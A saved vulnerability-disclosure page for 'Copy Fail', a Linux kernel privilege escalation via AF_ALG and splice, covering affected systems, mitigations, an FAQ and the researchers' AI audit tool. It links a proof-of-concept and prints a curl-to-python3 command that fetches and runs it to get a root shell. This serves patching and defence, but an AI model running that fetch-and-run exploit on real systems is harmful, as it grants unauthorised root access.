---
title: "Copy Fail — 732 Bytes to Root"
source: "https://copy.fail/#affected"
author:
  - "[[Xint]]"
published:
created: 2026-05-01
description: "Copy Fail (CVE-2026-31431): a 732-byte Linux LPE — straight-line, no race, no per-distro offsets. Same Python script roots Ubuntu, Amazon Linux, RHEL, SUSE since 2017. Page-cache write bypasses on-disk file-integrity tools and crosses container boundaries. Found by Xint Code."
tags:
  - "clippings exploit copyfail"
---
## Copy Fail

Most Linux LPEs need a race window or a kernel-specific offset.  
Copy Fail is a **straight-line logic flaw** — it needs neither.  
The same **732-byte** Python script roots every Linux distribution shipped since 2017.

One logic bug in `authencesn`, chained through `AF_ALG` and `splice()` into a 4-byte page-cache write — silently exploitable for nearly a decade.

## Who is affected

If your kernel was built between 2017 and the patch — which covers essentially every mainstream Linux distribution — you're in scope.

Copy Fail requires only an unprivileged local user account — no network access, no kernel debugging features, no pre-installed primitives. The kernel crypto API (`AF_ALG`) ships enabled in essentially every mainstream distro's default config, so the entire 2017 → patch window is in play out of the box.

**Distributions we directly verified:**

| Distribution | Kernel |
| --- | --- |
| Ubuntu 24.04 LTS | `6.17.0-1007-aws` |
| Amazon Linux 2023 | `6.18.8-9.213.amzn2023` |
| RHEL 10.1 | `6.12.0-124.45.1.el10_1` |
| SUSE 16 | `6.12.0-160000.9-default` |

These are what we tested directly. Other distributions running affected kernels — Debian, Arch, Fedora, Rocky, Alma, Oracle, the embedded crowd — behave the same. Tested it elsewhere? [Open an issue](https://github.com/theori-io/copy-fail-CVE-2026-31431) to add to the list.

**Should you patch first?**

High

### Multi-tenant Linux hosts

Shared dev boxes, shell-as-a-service, jump hosts, build servers — anywhere multiple users share a kernel.

any user becomes root

High

### Kubernetes / container clusters

The page cache is shared across the host. A pod with the right primitives compromises the node and crosses tenant boundaries.

cross-container, cross-tenant

High

### CI runners & build farms

GitHub Actions self-hosted runners, GitLab runners, Jenkins agents — anything that executes untrusted PR code as a regular user, on a shared kernel.

a PR becomes root on the runner

High

### Cloud SaaS running user code

Notebook hosts, agent sandboxes, serverless functions, any tenant-supplied container or script.

tenant becomes host root

Medium

### Standard Linux servers

Single-tenant production where only your team has shell access.

internal LPE; chains with web RCE or stolen creds

Lower

### Single-user laptops & workstations

You're already the only user. The bug doesn't grant remote attackers access by itself, but any local code execution becomes root.

post-exploitation step-up

## Exploit

The PoC is published so defenders can verify their own systems and validate vendor patches.

**Use responsibly.** Run only on systems you own or have written authorization to test. The script edits the page cache of a setuid binary; the change is not persistent across reboot, but the resulting root shell is real. Don't run it on production.

copy\_fail\_exp.py 732 B

Standalone PoC. Python 3.10+ stdlib only (`os`, `socket`, `zlib`).  
Targets `/usr/bin/su` by default; pass another setuid binary as `argv[1]`.

sha256: a567d09b15f6e4440e70c9f2aa8edec8ed59f53301952df05c719aa3911687f9

[Download (GitHub)](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py)

Quick run:

```
$ curl https://copy.fail/exp | python3 && su
# id
uid=0(root) gid=1002(user) groups=1002(user)
```

Issue tracker: [https://github.com/theori-io/copy-fail-CVE-2026-31431](https://github.com/theori-io/copy-fail-CVE-2026-31431)

## Mitigation

**Patch first.** Update your distribution's kernel package to one that includes mainline commit `a664bf3d603d` — it reverts the 2017 `algif_aead` in-place optimization, so page-cache pages can no longer end up in the writable destination scatterlist. Most major distributions are shipping the fix now.

**Before you can patch:** disable the `algif_aead` module.

```
# echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
# rmmod algif_aead 2>/dev/null || true
```

**What does this break?** For the vast majority of systems — nothing measurable.

- **Will not affect:** dm-crypt / LUKS, kTLS, IPsec/XFRM, in-kernel TLS, OpenSSL/GnuTLS/NSS default builds, SSH, kernel keyring crypto. These all use the in-kernel crypto API directly — they don't go through `AF_ALG`.
- **May affect:** userspace specifically configured to use AF\_ALG — e.g. OpenSSL with the `afalg` engine explicitly enabled, some embedded crypto offload paths, or applications that bind `aead` / `skcipher` / `hash` sockets directly. Check with `lsof | grep AF_ALG` or `ss -xa` if in doubt.
- **Performance:** `AF_ALG` is a userspace front door to the kernel crypto API. Disabling it does not slow anything that wasn't already calling it; for the things that were, performance falls back to a normal userspace crypto library, which is what almost everything else already does.

For untrusted workloads (containers, sandboxes, CI), block `AF_ALG` socket creation via seccomp regardless of patch state.

## FAQ

Why does this matter more than other Linux LPEs?→

Linux LPE CVEs ship daily. Most are race-dependent, narrowly version-specific, or both. **Copy Fail isn't** — it's a straight-line logic flaw with four properties that almost never appear together:

- **Portable.** Same script roots Ubuntu, Amazon Linux, RHEL, SUSE. No per-distro offsets, no version checks, no recompilation.
- **Tiny.** 732-byte Python script, stdlib only (`os`, `socket`, `zlib`). No compiled payload, no dependencies. Python 3.10+ for `os.splice`.
- **Stealthy.** The write bypasses the VFS path entirely; the corrupted page is never marked dirty. Nothing hits disk — on eviction or reboot, the cache reloads clean and a forensic disk image shows the original file. (See the integrity-tool FAQ entry below for the in-cache detection window.)
- **Cross-container.** The page cache is shared across the host. A pod with the right primitives compromises the node and crosses tenant boundaries — container escape primitive, not just LPE.

|  | typical Linux LPE | Copy Fail |
| --- | --- | --- |
| Race condition | required | none |
| Per-distro offsets | required | none |
| Reliability | 30–80% per attempt | 100%, single shot |
| Affected window | narrow kernel range | 2017 → 2026 (9 yrs) |

Comparison framing the typical LPE class against Copy Fail's specific guarantees, not any one named CVE.

What is Copy Fail in one sentence?→

An unprivileged local user can write 4 controlled bytes into the page cache of any readable file on a Linux system, and use that to gain root.

Why is the page cache the target, not the file on disk?→

The page cache is the in-memory copy the kernel reads when it loads a binary. Modifying the cached copy of `/usr/bin/su` is equivalent — for `execve` purposes — to modifying the binary itself, except nothing on disk changes, no inotify fires, no checksum mismatches.

Will my file integrity tool detect this?→

Probably yes — *while the corruption is hot in cache*. Standard hashing tools (`sha256sum`, AIDE, Tripwire) read via `read()`, which goes through the page cache — the same path `execve` uses. So during the window, the hash differs from the baseline.

The corruption is transient, though. Nothing is written back to disk: once the page is evicted (memory pressure, `echo 3 > /proc/sys/vm/drop_caches`) or the system reboots, the cache reloads clean from disk and hashes match again. A forensic image of the disk shows the unmodified file.

IMA appraisal in enforcing mode with measurement-on-every-read catches it at `execve` time, before the corrupted binary runs.

Should I be afraid?→

If you run multi-tenant Linux, shared-kernel containers, CI runners that execute untrusted code, or anything where someone you don't fully trust can `execve` as a regular user — yes. Patch.

Single-user laptop with full-disk encryption and a locked screen — far less urgent. Patch anyway.

Why "Copy Fail"?→

Because `authencesn` doesn't actually copy when it should. It uses the caller's destination buffer as a scratch pad, scribbles 4 bytes past the legitimate output region, and never restores them. The "copy" of the AAD ESN bytes "fails" to stay inside the destination buffer.

How is this different from Dirty Pipe?→

Same family — page-cache corruption from unprivileged userspace, no on-disk change, write to setuid binary, root. Different mechanism: Dirty Pipe abused pipe buffer flags. Copy Fail abuses an AEAD scratch write that crosses a chained scatterlist boundary.

Copy Fail is more portable. One script, every distro, no offsets. Dirty Pipe needed kernel ≥ 5.8 with specific patches; Copy Fail covers the entire 2017–2026 window.

How is this different from Dirty Cow?→

No race condition. Dirty Cow needed to win a TOCTOU window in the COW path — multiple attempts, occasionally crashes the system. Copy Fail is straight-line code. It either fires or it doesn't, and it always fires.

Does it require `/usr/bin/su`?→

No. Any setuid-root binary readable by the user works. `passwd`, `chsh`, `chfn`, `mount`, `sudo`, `pkexec` are all viable. The PoC defaults to `su` because it's present on every distro tested.

Is this remotely exploitable?→

Not by itself — it requires local code execution as a regular user. Chain it with anything that gives you that (web RCE landing in an unprivileged service account, an SSH foothold, a malicious PR on a CI runner) and you're root.

What does the patch do?→

It reverts the 2017 `algif_aead` in-place optimization. After the patch, `req->src` and `req->dst` are separate scatterlists again — page-cache pages live in the read-only source, the user buffer is the only thing crypto can write to. Mainline commit `a664bf3d603d`.

Will you release the full PoC?→

Yes — it's [on this page](#exploit). We held it for a month while distros prepared patches; the major builds are out as of this writing.

Was this AI-found?→

AI-assisted. The starting insight — that `splice()` hands page-cache pages into the crypto subsystem and that scatterlist page provenance might be an under-explored bug class — came from human research by Taeyang Lee at Xint.

From there, [Xint Code](#contact) scaled the audit across the entire `crypto/` subsystem in roughly an hour. Copy Fail was the highest-severity finding in the run.

Where's the full technical write-up?→

Root cause, scatterlist diagrams, the 2011 → 2015 → 2017 history, and the exploit walkthrough are on the [Xint blog](https://xint.io/blog/copy-fail-linux-distributions). Part 2 (Kubernetes container escape) is forthcoming.

## Disclosure timeline

- Reported to Linux kernel security team
- Initial acknowledgment
- Patches proposed and reviewed
- Patch committed to mainline
- CVE-2026-31431 assigned
- Public disclosure ([https://copy.fail/](https://copy.fail/))

## Xint Code

[![Xint Code](https://copy.fail/xint-code-logo.svg)](https://code.xint.io/)

Is your software AI-era safe?

Copy Fail was surfaced by [Xint Code](https://code.xint.io/) about an hour of scan time against the Linux `crypto/` subsystem. Full root cause, diagrams, and the operator prompt that found it are in the [Xint blog write-up](https://xint.io/blog/copy-fail-linux-distributions).

The same scan also surfaced other high-severity bugs, still in coordinated disclosure. Xint Code audits production codebases the same way — one operator prompt, no harnessing, prioritized findings with trigger and impact narratives.

Track record

0-day RCE

ZeroDay Cloud

Swept the database category — Redis, PostgreSQL, MariaDB. Zero human intervention.

Top 3

DARPA AIxCC

Finalist in the AI Cyber Challenge hosted by DoD DARPA.

9×

DEF CON CTF

Most-winning team in DEF CON CTF history.